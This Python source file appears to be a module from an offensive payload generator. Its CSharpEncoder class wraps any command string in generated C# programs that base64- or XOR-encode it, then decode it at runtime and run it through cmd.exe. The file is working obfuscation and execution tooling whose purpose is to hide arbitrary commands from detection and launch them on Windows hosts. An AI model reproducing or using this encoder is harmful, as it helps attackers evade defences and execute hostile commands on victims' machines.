import base64
from .base_encoder import BaseEncoder

class CSharpEncoder(BaseEncoder):
    """C# specific encoder"""
    
    def encode(self, payload: str, method: str) -> str:
        if method == "base64":
            return self._base64_wrapper(payload)
        elif method == "xor":
            return self._xor_wrapper(payload)
        else:
            return payload
    
    def _base64_wrapper(self, payload: str) -> str:
        """Base64 encode C# payload"""
        encoded = base64.b64encode(payload.encode()).decode()
        return f"""
using System;
using System.Text;

class Program {{
    static void Main() {{
        string encoded = "{encoded}";
        string decoded = Encoding.UTF8.GetString(Convert.FromBase64String(encoded));
        System.Diagnostics.Process.Start("cmd.exe", "/c " + decoded);
    }}
}}
"""
    
    def _xor_wrapper(self, payload: str, key: str = "0xD4") -> str:
        """XOR encode C# payload"""
        encoded = []
        for i, c in enumerate(payload):
            encoded.append(ord(c) ^ ord(key[i % len(key)]))
        encoded_bytes = bytes(encoded)
        encoded_str = base64.b64encode(encoded_bytes).decode()
        
        return f"""
using System;
using System.Text;

class Program {{
    static void Main() {{
        string key = "{key}";
        byte[] encoded = Convert.FromBase64String("{encoded_str}");
        StringBuilder decoded = new StringBuilder();
        
        for (int i = 0; i < encoded.Length; i++) {{
            decoded.Append((char)(encoded[i] ^ key[i % key.Length]));
        }}
        
        System.Diagnostics.Process.Start("cmd.exe", "/c " + decoded.ToString());
    }}
}}
"""